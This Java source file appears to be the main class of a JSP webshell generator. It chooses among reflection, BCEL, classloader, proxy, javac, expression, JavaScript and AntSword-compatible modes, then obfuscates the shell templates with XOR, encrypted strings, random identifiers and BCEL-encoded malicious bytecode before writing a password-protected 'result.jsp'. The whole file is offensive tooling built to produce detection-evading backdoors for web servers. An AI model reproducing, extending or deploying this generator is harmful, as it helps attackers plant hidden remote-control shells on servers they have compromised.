package org.sec.start;

import com.beust.jcommander.JCommander;
import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
import com.github.javaparser.ast.body.ConstructorDeclaration;
import com.github.javaparser.ast.body.MethodDeclaration;
import com.github.javaparser.ast.body.VariableDeclarator;
import com.github.javaparser.ast.expr.ArrayInitializerExpr;
import com.github.javaparser.ast.expr.MethodCallExpr;
import com.github.javaparser.ast.expr.StringLiteralExpr;
import com.github.javaparser.ast.type.ClassOrInterfaceType;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.log4j.Logger;
import org.sec.core.ByteCodeEvilDump;
import org.sec.input.Command;
import org.sec.module.CroptoArray;
import org.sec.module.IdentifyModule;
import org.sec.module.StringModule;
import org.sec.module.XORModule;
import org.sec.util.RandomUtil;
import org.sec.util.WriteUtil;

import java.io.IOException;
import java.util.List;

public class Application {
    private static final Logger logger = Logger.getLogger(Application.class);

    public static void start(String[] args) {
        try {
            // 处理用户输入的参数，如 -h 等
            Command command = new Command();
            JCommander jc = JCommander.newBuilder().addObject(command).build();
            jc.parse(args);

            if (command.help) {
                jc.usage();
                return;
            }
            if (command.output == null || command.output.equals("")) {
                command.output = "result.jsp";
            }
            if (command.jsModule) {
                logger.info("use javascript module");
                doJavaScript(command);
                return;
            }
            if (command.javacModule) {
                logger.info("use javac module");
                doJavac(command);
                return;
            }
            if (command.exprModule) {
                logger.info("use expression module");
                doExpr(command);
                return;
            }
            if (command.bcelModule) {
                logger.info("use bcel module");
                doBcel(command);
                return;
            }
            if (command.bcelAsmModule) {
                logger.info("use bcel asm module");
                doBcelAsm(command);
                return;
            }
            if (command.classLoaderModule) {
                logger.info("use classloader module");
                doClassLoader(command);
                return;
            }
            if (command.classLoaderAsmModule) {
                logger.info("use classloader asm module");
                doClassLoaderAsm(command);
                return;
            }
            if (command.proxyModule) {
                logger.info("use proxy module");
                doProxy(command);
                return;
            }
            if (command.proxyAsmModule) {
                logger.info("use proxy asm module");
                doProxyAsm(command);
                return;
            }
            if (command.antSword) {
                logger.info("use ant sword module");
                doAnt(command);
                return;
            }
            logger.info("use reflection module");
            doSimple(command);
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
    }

    public static void doClassLoaderAsm(Command command) throws IOException {
        Base.asmBase(command, "CLAsm.java", true);
    }

    public static void doClassLoader(Command command) throws IOException {
        Base.classLoaderBase(command, "CL.java", true);
    }

    public static void doProxyAsm(Command command) throws IOException {
        Base.asmBase(command, "ProxyAsm.java", false);
    }

    // 已分析
    public static void doBcel(Command command) throws IOException {
        logger.info("read bcel method");
        MethodDeclaration bcelMethod = Base.getMethod("Bcel.java");

        logger.info("read decrypt method");
        MethodDeclaration decMethod = Base.getMethod("Dec.java");

        if (bcelMethod == null || decMethod == null) {
            return;
        }

        byte[] resultByte = ByteCodeEvilDump.dump("test/ByteCodeEvil");
        if (resultByte == null || resultByte.length == 0) {
            return;
        }

        String byteCode = Utility.encode(resultByte, true);
        byteCode = "$$BCEL$$" + byteCode;
        logger.info("modify global array");

        List<VariableDeclarator> vds = bcelMethod.findAll(VariableDeclarator.class);
        for (VariableDeclarator vd : vds) {
            if (vd.getNameAsString().equals("globalArr")) {
                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
                //首部加上 $$BCEL$$ ，这样才能正确运行
                sles.get(1).setValue(byteCode);
            }
        }
        // 开始混淆
        String newDecName = Base.decCodeOperate(decMethod);
        Base.normalOperate(bcelMethod, newDecName);

        WriteUtil.write(bcelMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    public static void doBcelAsm(Command command) throws IOException {
        Base.asmBase(command, "BcelAsm.java", false);
    }

    // 已分析
    public static void doJavac(Command command) throws IOException {
        logger.info("read javac method");
        MethodDeclaration javacMethod = Base.getMethod("Javac.java");

        logger.info("read decrypt method");
        MethodDeclaration decMethod = Base.getMethod("Dec.java");
        if (javacMethod == null || decMethod == null) {
            return;
        }

        String newDecName = Base.decCodeOperate(decMethod);
        Base.normalOperate(javacMethod, newDecName);
        WriteUtil.writeJavac(javacMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    public static void doAnt(Command command) throws IOException {
        logger.info("read ant sword method");
        MethodDeclaration antMethod = Base.getMethod("Ant.java");
        logger.info("read ant sword base64 method");
        MethodDeclaration antDecMethod = Base.getMethod("AntBase64.java");
        logger.info("read decrypt method");
        MethodDeclaration decMethod = Base.getMethod("Dec.java");
        List<ClassOrInterfaceDeclaration> antClasses = Base.getAntClass();
        String antClassName = RandomUtil.getRandomString(10);
        if (antMethod == null) {
            return;
        }
        List<ArrayInitializerExpr> arrayExpr = antMethod.findAll(ArrayInitializerExpr.class);
        StringLiteralExpr expr = (StringLiteralExpr) arrayExpr.get(0).getValues().get(1);
        expr.setValue(command.password);
        String antClassCode = null;
        String antDecCode;
        String antCode;
        String decCode;
        logger.info("generate ant sword class");
        for (ClassOrInterfaceDeclaration c : antClasses) {
            if (!c.getNameAsString().equals("Ant")) {
                c.setName(antClassName);
                ConstructorDeclaration cd = c.findFirst(ConstructorDeclaration.class).isPresent() ?
                        c.findFirst(ConstructorDeclaration.class).get() : null;
                if (cd == null) {
                    return;
                }
                cd.setName(antClassName);
                IdentifyModule.doConstructIdentify(cd);
                XORModule.doXORForConstruct(cd);
                c.findAll(MethodDeclaration.class).forEach(m -> {
                            IdentifyModule.doIdentify(m);
                            XORModule.doXOR(m);
                            XORModule.doXOR(m);
                        }
                );
                antClassCode = c.toString();
            }
        }
        logger.info("generate ant sword base64 method");
        if (decMethod == null || antDecMethod == null) {
            return;
        }
        CroptoArray croptoArray = StringModule.encodeString(antDecMethod);
        StringModule.changeRef(antDecMethod, croptoArray);
        XORModule.doXOR(antDecMethod);
        XORModule.doXOR(antDecMethod);
        logger.info("generate ant sword core code");
        antMethod.findAll(ClassOrInterfaceType.class).forEach(ci -> {
            if (ci.getNameAsString().equals("U")) {
                ci.setName(antClassName);
            }
        });
        String newDecName = Base.decCodeOperate(decMethod);
        antDecMethod.findAll(MethodCallExpr.class).forEach(mce -> {
            if (mce.getNameAsString().equals("dec")) {
                mce.setName(newDecName);
            }
        });
        antDecCode = antDecMethod.toString();
        Base.normalOperate(antMethod, newDecName);
        String antCodeTmp = antMethod.getBody().isPresent() ?
                antMethod.getBody().get().toString() : null;
        if (antCodeTmp == null) {
            return;
        }
        antCode = antCodeTmp.substring(1, antCodeTmp.length() - 2);
        decCode = decMethod.toString();
        WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode, command.output);
        logger.info("finish");
    }

    public static void doProxy(Command command) throws IOException {
        Base.classLoaderBase(command, "Proxy.java", false);
    }

    // 已分析
    public static void doJavaScript(Command command) throws IOException {
        Base.base(command, "JS.java");
    }

    // 已分析
    public static void doExpr(Command command) throws IOException {
        // 参数：Command command, String method
        // 参数 String method : 引用的模板文件，并据此进行混淆
        Base.base(command, "Beans.java");
    }

    // 已分析
    public static void doSimple(Command command) throws IOException {
        Base.base(command, "Base.java");
    }

}
